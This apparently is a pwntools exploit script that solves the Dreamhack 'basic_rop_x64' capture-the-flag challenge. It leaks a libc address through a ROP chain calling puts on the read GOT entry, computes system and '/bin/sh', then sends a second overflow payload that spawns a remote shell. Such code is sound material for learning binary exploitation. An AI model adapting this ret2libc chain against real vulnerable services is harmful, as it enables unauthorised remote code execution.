from pwn import *
context.log_level = 'debug'

hosts = 'host1.dreamhack.games'
port = 10810

p = remote(hosts,port)

pop1_ret = 0x0000000000400883

elf = ELF('./basic_rop_x64')
libc = ELF('./libc.so.6')

main_addr = elf.symbols['main']
puts_plt = elf.plt['puts']
read_got = elf.got['read']

read_offset = libc.symbols['read']
system_offset = libc.symbols['system']
binsh_offset = next(libc.search(b'/bin/sh\x00'))

payload = b'A'*0x40+b'B'*0x8
payload += p64(pop1_ret)
payload += p64(read_got)
payload += p64(puts_plt)
payload += p64(main_addr)

p.send(payload)
p.recv(0x48)
recv_read_got = p.recvline()[:-1]
recv_read_got += b'\x00'*2
recv_read_got = u64(recv_read_got)
log.info('recv_read_got : '+str(hex(recv_read_got)))

libc_base = recv_read_got-read_offset
system_addr = libc_base+system_offset
log.info('system_addr : '+str(hex(system_addr)))

binsh_addr = libc_base+binsh_offset
log.info('binsh_addr : '+str(hex(binsh_addr)))

payload = b'A'*0x40+b'B'*0x8
payload += p64(pop1_ret)
payload += p64(binsh_addr)
payload += p64(system_addr)

p.send(payload)

p.interactive()
